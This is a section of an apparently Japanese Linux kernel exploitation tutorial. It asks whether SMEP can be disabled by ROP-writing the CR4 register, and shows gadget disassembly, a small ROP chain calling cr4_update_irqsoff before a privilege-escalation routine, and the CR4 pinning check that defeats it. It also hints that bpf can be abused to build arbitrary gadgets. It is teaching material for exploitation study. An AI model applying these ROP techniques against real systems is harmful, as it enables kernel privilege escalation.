### SMEPの無効化？
ここまででkROPにより権限昇格できることが確認できましたが、実は別の方法を考えてみましょう。
[セキュリティ機構](../introduction/security#smep-supervisor-mode-execution-prevention)の節で説明したように、SMEPはCR4レジスタで制御されています。したがって、ROPでCR4レジスタの21ビット目をフリップできればSMEPが無効化され、ret2userが使えるようになるはずです。

問題はそのようなROP gadgetが存在するかです。CR4に対する即値の演算はできないので、別の汎用レジスタ経由で操作することになります。CR4を操作するコードはカーネル中に存在するので、そのようなgadgetは必ずありますが、副作用なくretで終わるものがあるかはobjdumpで探す必要があります。（多くのツールはCRレジスタに対する操作を正しく見つけてくれない上、このような処理の後にはjmpが続くことが多いです。）
例えば次のようにCR4を設定するgadgetは存在します。
```
ffffffff810284d5:       0f 22 e7                mov    cr4,rdi
ffffffff810284d8:       8b 05 4a 2f d4 00       mov    eax,DWORD PTR [rip+0xd42f4a]        # 0xffffffff81d6b428
ffffffff810284de:       85 c0                   test   eax,eax
ffffffff810284e0:       7e ea                   jle    0xffffffff810284cc
...
ffffffff810284cc:       c3                      ret
```

```
ffffffff81028535:       8b 05 ed 2e d4 00       mov    eax,DWORD PTR [rip+0xd42eed]        # 0xffffffff81d6b428
ffffffff8102853b:       85 c0                   test   eax,eax
ffffffff8102853d:       7f a5                   jg     0xffffffff810284e4
ffffffff8102853f:       c3                      ret
```
すぐさまretで終わるようなgadgetは見つからないので、これらのgadgetがどこから来たものか確認しましょう。kallsymsから近いアドレスにある関数を見つけます。
```
/ # cat /proc/kallsyms | grep ffffffff810285
ffffffff81028540 T native_write_cr4
ffffffff810285b0 T cr4_init
/ # cat /proc/kallsyms | grep ffffffff810284
ffffffff81028440 t default_init
ffffffff810284b0 T cr4_update_irqsoff
```
それぞれ[`cr4_init`](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/kernel/cpu/common.c#L420)、[`cr4_update_irqsoff`](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/kernel/cpu/common.c#L399)という関数から来ています。
特に`cr4_update_irqsoff`という関数は使えそうな見た目をしています。
```c
void cr4_update_irqsoff(unsigned long set, unsigned long clear)
{
	unsigned long newval, cr4 = this_cpu_read(cpu_tlbstate.cr4);

	lockdep_assert_irqs_disabled();

	newval = (cr4 & ~clear) | set;
	if (newval != cr4) {
		this_cpu_write(cpu_tlbstate.cr4, newval);
		__write_cr4(newval);
	}
}
EXPORT_SYMBOL(cr4_update_irqsoff);
```
CR4中で1に更新するビットと0に更新するビットを引数で操作できます。
そこで次のようなROP chianを実行してみます。
```c
  *chain++ = rop_pop_rdi;
  *chain++ = 0; // bit to set
  *chain++ = rop_pop_rsi;
  *chain++ = 1 << 20; // bit to clear
  *chain++ = cr4_update_irqsoff;
  *chain++ = (unsigned long)&escalate_privilege;
```
これを実行すると、やはり`escalate_privilege`実行時にSMEPでクラッシュしてしまいます。直前でCR4の値を確認すると、SMEPのビットが有効になっていることが分かります。なぜCR4が更新できていないのかステップ実行で確認しましょう。

<center>
  <img src="img/update_cr4.png" alt="cr4_update_irqoffのCR4更新部分" style="width:640px;">
</center>

この機械語は`cr4_update_irqsoff`の次の部分にあたります。
```
if (newval != cr4) {
```
これを見ても分かるように、この段階では実際のCR4レジスタの値を読み書きしていません。さらにステップ実行を進めると、次のようなパスに入ります。

<center>
  <img src="img/pinned_cr4.png" alt="CR4の固定ビット変更の検出処理" style="width:640px;">
</center>

RDIレジスタには次のような文字列ポインタが入っています。

<center>
  <img src="img/pinned_cr4_message.png" alt="pinned CR4 bits changed" style="width:480px;">
</center>

このメッセージでカーネルコードを検索すると、[`native_write_cr4`](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/kernel/cpu/common.c#L377)に次のような処理があります。
```c
	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
```
`cr_pinning`というグローバル変数があります。実はちょっとしたセキュリティ機構があり、CR4レジスタの特定のビットは変更できないようになっています。
`cr4_pinned_bits`は定数なので変更できませんし、`cr_pinning`に関してはread onlyな箇所のデータが使われるので変更できません。機械語では次の部分にあたります。

<center>
  <img src="img/cr_pinning.png" alt="cr_pinningの確認" style="width:480px;">
</center>

このように、`native_write_cr4`を利用する場合はチェックが入るため、SMEPやSMAPは動的に無効化できないことが分かりました。ROPができる状況になったら、CR4を書き換えるより`commit_creds`を使う方が簡単です。
しかし、SMEPを無効化する手法はWindows 7のKernel Exploitなどで登場します。

ということで例題の答えは、「`native_write_cr4`を使わずにCR4に0x1000をORできるROP gadgetが存在すれば可能」です。

<div class="balloon_l">
  <div class="faceicon"><img src="../img/cow.jpg" alt="牛さん" ></div>
  <p class="says">
    CR4に0x1000をORしてくれるようなgadgetは普通は存在しないけど、実はbpfというLinux Kernelの機能を悪用すれば任意のgadgetが作れるよ。
  </p>
</div>

